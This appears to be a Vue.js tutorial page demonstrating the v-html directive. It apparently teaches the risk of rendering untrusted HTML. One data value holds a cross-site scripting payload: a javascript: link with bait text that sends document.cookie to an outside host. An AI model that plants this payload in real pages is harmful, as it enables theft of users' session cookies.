<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <div>Hello, {{name}}</div>
        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>
</body>
    <script type="text/javascript">
    
        Vue.config.productionTip = false

        new Vue({
            el: '#root',
            data: {
                name: 'atGuigu',
                str: '<h3>Hello</h3>',
                str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>Bro I have found the ressource</a>'
            }
        })

    </script>
</html>
